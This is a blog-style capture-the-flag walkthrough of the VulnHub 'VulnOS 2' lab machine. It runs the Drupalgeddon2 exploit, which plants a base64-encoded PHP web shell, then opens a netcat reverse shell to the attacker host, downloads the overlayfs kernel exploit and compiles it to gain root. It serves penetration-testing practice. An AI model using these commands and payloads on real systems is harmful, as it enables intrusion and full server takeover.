@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - VulnOS 2
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - VulnOS 2" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: Is a vulnerable virtual machine designed to improve penetration testing skills." />
+<meta property="og:description" content="Description: Is a vulnerable virtual machine designed to improve penetration testing skills." />
+<link rel="canonical" href="http://localhost:4000/vulnos2.html" />
+<meta property="og:url" content="http://localhost:4000/vulnos2.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/vulnos2.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-11-30T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/vulnos2.html" />
+<meta property="twitter:title" content="VulnHub - VulnOS 2" />
+<script type="application/ld+json">
+{"headline":"VulnHub - VulnOS 2","dateModified":"2021-11-30T00:00:00-05:00","datePublished":"2021-11-30T00:00:00-05:00","url":"http://localhost:4000/vulnos2.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulnos2.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: Is a vulnerable virtual machine designed to improve penetration testing skills.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - VulnOS 2</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>November 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> Is a vulnerable virtual machine designed to improve penetration testing skills.</p>
+
+<p><strong>Author:</strong> c4b3rw0lf</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell and read the flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/vulnos-2,147/">https://www.vulnhub.com/entry/vulnos-2,147/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping scan was performed to locate the target host, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
+192.168.179.172 <span class="o">=&gt;</span> up
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP/UDP scan was performed to detect open ports with unicornscan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.172:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3  <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.172:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+...
+TCP open                     ssh[   22]         from 192.168.179.172  ttl 64 
+TCP open                    http[   80]         from 192.168.179.172  ttl 64 
+TCP open                     irc[ 6667]         from 192.168.179.172  ttl 64
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>An aggressive scan was performed to detect more information about the open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80,6667 192.168.179.172 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b <span class="o">(</span>DSA<span class="o">)</span>
+|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 <span class="o">(</span>RSA<span class="o">)</span>
+|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: VulnOSv2
+6667/tcp open  irc     ngircd
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>The web page contains a link called <strong>website</strong>, we click on it.</p>
+
+<p><img src="/assets/images/vulnos2/screenshot-1.png" alt="" /></p>
+
+<p>Another web page is displayed on the screen, looking at the source it was possible to detect that it’s a Drupal 7.</p>
+
+<p><img src="/assets/images/vulnos2/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/vulnos2/screenshot-3.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+
+<p>A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.</p>
+
+<p>We download the exploit and install the dependencies.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>git clone https://github.com/dreadlocked/Drupalgeddon2
+root@kali:~<span class="nv">$ </span><span class="nb">cd </span>Drupalgeddon2 
+root@kali:~/Drupalgeddon2<span class="nv">$ </span>gem <span class="nb">install </span>highline
+Successfully installed highline-2.0.3
+Parsing documentation <span class="k">for </span>highline-2.0.3
+Done installing documentation <span class="k">for </span>highline after 10 seconds
+1 gem installed
+</code></pre></div></div>
+
+<p>We run the exploit adding the target URL as parameter.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Drupalgeddon2<span class="nv">$ </span>./drupalgeddon2.rb http://192.168.179.172/jabc/
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nt">--</span><span class="o">==[</span>::#Drupalggedon2::]<span class="o">==</span><span class="nt">--</span>
+<span class="nt">--------------------------------------------------------------------------------</span>
+<span class="o">[</span>i] Target : http://192.168.179.172/jabc/
+<span class="nt">--------------------------------------------------------------------------------</span>
+<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/CHANGELOG.txt    <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
+<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/core/CHANGELOG.txt    <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
+<span class="o">[</span>+] Found  : http://192.168.179.172/jabc/includes/bootstrap.inc    <span class="o">(</span>HTTP Response: 200<span class="o">)</span>
+<span class="o">[!]</span> WARNING: Could be a false-positive <span class="o">[</span>1-1], as the file could be reported to be missing
+<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/includes/bootstrap.inc    <span class="o">(</span>HTTP Response: 200<span class="o">)</span>
+<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/core/includes/bootstrap.inc    <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
+<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/includes/database.inc    <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
+<span class="o">[</span>+] Header : v7 <span class="o">[</span>X-Generator]
+<span class="o">[</span>+] Found  : http://192.168.179.172/jabc/    <span class="o">(</span>HTTP Response: 200<span class="o">)</span>
+<span class="o">[</span>+] Metatag: v7.x <span class="o">[</span>Generator]
+<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/    <span class="o">(</span>HTTP Response: 200<span class="o">)</span>
+<span class="o">[</span>+] Drupal?: v7.x
+<span class="nt">--------------------------------------------------------------------------------</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Testing: Form   <span class="o">(</span>user/password<span class="o">)</span>
+<span class="o">[</span>+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Testing: Clean URLs
+<span class="o">[!]</span> Result : Clean URLs disabled <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
+<span class="o">[</span>i] Isn<span class="s1">'t an issue for Drupal v7.x
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo OZVTAGPS
+[+] Result : OZVTAGPS
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://192.168.179.172/jabc/shell.php)
+[i] Response: HTTP 404 // Size: 5
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : &lt;?php if( isset( $_REQUEST['</span>c<span class="s1">'] ) ) { system( $_REQUEST['</span>c<span class="s1">'] . '</span> 2&gt;&amp;1<span class="s1">' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl '</span>http://192.168.179.172/jabc/shell.php<span class="s1">' -d '</span><span class="nv">c</span><span class="o">=</span><span class="nb">hostname</span><span class="s1">'
+VulnOSv2&gt;&gt; whereis nc
+nc: /bin/nc /bin/nc.traditional /usr/share/man/man1/nc.1.gz
+</span></code></pre></div></div>
+
+<p>As we can see the exploitation was successful, then we set up a netcat listener on port 443 and execute the following netcat instruction:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VulnOSv2&gt;&gt; nc 192.168.179.1 443 <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+
+<p>We got a shell with low privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.172] 49471
+python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
+www-data@VulnOSv2:/var/www/html/jabc<span class="err">$</span>
+</code></pre></div></div>
+
+<p>This kernel version is vulnerable to the following exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@VulnOSv2:/var/www/html/jabc<span class="nv">$ </span><span class="nb">cat</span> /proc/version
+<span class="nb">cat</span> /proc/version
+Linux version 3.13.0-24-generic <span class="o">(</span>buildd@komainu<span class="o">)</span> <span class="o">(</span>gcc version 4.8.2 <span class="o">(</span>Ubuntu 4.8.2-19ubuntu1<span class="o">)</span> <span class="o">)</span> <span class="c">#47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit ubuntu 3.13.0                                                                                       
+<span class="nt">-----------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------</span>
+ Exploit Title                                                                                             |  Path                   
+<span class="nt">-----------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------</span>
+Linux Kernel 3.13.0 &lt; 3.19 <span class="o">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="o">)</span> - <span class="s1">'overlayfs'</span> Local Privilege Escalation       | linux/local/37292.c
+...
+<span class="nt">-----------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="kernel-exploit">Kernel Exploit</h3>
+
+<p>The overlayfs implementation in the linux (aka Linux kernel) package before3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissionsfor file creation in the upper filesystem directory, which allows localusers to obtain root access by leveraging a configuration in whichoverlayfs is permitted in an arbitrary mount namespace.</p>
+
+<p>We copy the exploit to our current directory and start a web server with python.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/37292.c
+
+root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>On the target machine we download it, compile it and execute it. As we can see now we are root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@VulnOSv2:/tmp<span class="nv">$ </span>wget 192.168.179.1/37292.c <span class="nt">-O</span> ofs.c
+
+www-data@VulnOSv2:/tmp<span class="nv">$ </span>gcc ofs.c <span class="nt">-o</span> ofs
+gcc ofs.c <span class="nt">-o</span> ofs
+www-data@VulnOSv2:/tmp<span class="nv">$ </span>./ofs
+./ofs
+spawning threads
+mount <span class="c">#1</span>
+mount <span class="c">#2</span>
+child threads <span class="k">done</span>
+/etc/ld.so.preload created
+creating shared library
+<span class="c"># id</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+
+<span class="c"># cd /root</span>
+<span class="nb">cd</span> /root
+<span class="c"># ls</span>
+<span class="nb">ls
+</span>flag.txt
+<span class="c"># cat flag.txt</span>
+<span class="nb">cat </span>flag.txt
+Hello and welcome.
+You successfully compromised the company <span class="s2">"JABC"</span> and the server completely <span class="o">!!</span>
+Congratulations <span class="o">!!!</span>
+Hope you enjoyed it.
+
+What <span class="k">do </span>you think of A.I.?
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
